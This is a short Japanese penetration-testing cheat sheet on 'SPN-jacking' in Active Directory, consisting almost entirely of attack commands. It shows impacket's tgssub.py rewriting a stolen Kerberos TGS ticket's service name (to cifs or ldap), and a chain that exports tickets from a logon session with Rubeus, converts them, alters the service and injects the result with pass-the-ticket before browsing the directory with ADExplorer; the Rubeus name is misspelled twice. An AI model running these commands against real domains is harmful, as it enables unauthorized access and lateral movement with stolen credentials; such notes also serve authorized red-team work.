---
title: SPN-jacking
category: active directory
weight: -1
---

TGSチケットのサービス名の変更
https://github.com/fortra/impacket/pull/1256/files
```
tgssub.py -in input.ccache -out output.ccache -altservice cifs/example.com
```

---

Rubeus.exeからTGSチケットを取り出して、ldap用に変えて、ADExplorer
```
Rubues.exe klist
Rubues.exe export /luid:0xxxx

python3 impacket-ticketConverter cifs.kirbi cifs.ccache
python3 tgssub.py -in cifs.ccache -out ldap.ccache -altservice 'ldap'

Rubeus.exe ptt /ticket:ldap.kirbi
ADExplorer実行するなど
```

